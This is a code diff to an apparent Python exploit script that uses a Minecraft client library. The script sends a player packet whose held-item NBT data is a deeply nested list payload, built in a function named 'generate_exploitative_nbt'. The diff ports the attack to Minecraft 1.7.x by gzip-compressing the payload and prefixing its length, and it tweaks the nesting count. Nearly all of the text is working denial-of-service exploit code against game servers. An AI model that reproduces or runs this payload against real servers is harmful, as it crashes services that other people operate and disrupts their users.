@@ -4,6 +4,9 @@ import struct
 from optparse import OptionParser
 from io import BytesIO
 
+import cStringIO
+import gzip
+
 from minecraft import authentication
 from minecraft.exceptions import YggdrasilError
 from minecraft.networking.connection import Connection
@@ -56,7 +59,7 @@ def write_lists(recursion_count, data):
     if recursion_count > 4:
         return
 
-    tag_id_and_name(9, "", data)
+    tag_id_and_name(9, "", data) # nbt LIST tags are unnamed, why this..?
     data.write(struct.pack('>b', 9))
     data.write(struct.pack('>i', 10))
     for i in range(10):
@@ -67,14 +70,12 @@ def generate_exploitative_nbt():
 
     tag_id_and_name(10, "rekt", data)
 
-    for i in range(300):
+    for i in range(250): 
         if i % 20 == 0:
             print("List count: " + str(i))
         write_lists(0, data)
-
     data.write(struct.pack('>b', 0))
     return data.getvalue()
-
 
 def main():
     exploit_data = generate_exploitative_nbt()
@@ -90,7 +91,20 @@ def main():
     exploit_packet.held_item_id = 1
     exploit_packet.held_item_count = 1
     exploit_packet.held_item_damage = 0
-    exploit_packet.held_item_nbt = exploit_data
+    # MC 1.7.x compressed all NBT using gzip; a short indicating size prepends the raw data.
+    # requires gzip which is annoying
+    ftemp = cStringIO.StringIO()
+    gzip_obj = gzip.GzipFile(
+        mode='w', fileobj=ftemp)
+    gzip_obj.write(exploit_data)
+    gzip_obj.close()
+    exploit_compress = ftemp.getvalue()
+    #exploit_compress = compress(exploit_data)
+    print("NBT Payload length: " + str(len(exploit_compress)))
+    exploit_prepare = BytesIO()
+    exploit_prepare.write(struct.pack('>h', len(exploit_compress) ) )
+    exploit_prepare.write(exploit_compress)
+    exploit_packet.held_item_nbt = exploit_prepare.getvalue()
     exploit_packet.cursor_position_x = 0
     exploit_packet.cursor_position_y = 0
     exploit_packet.cursor_position_z = 0
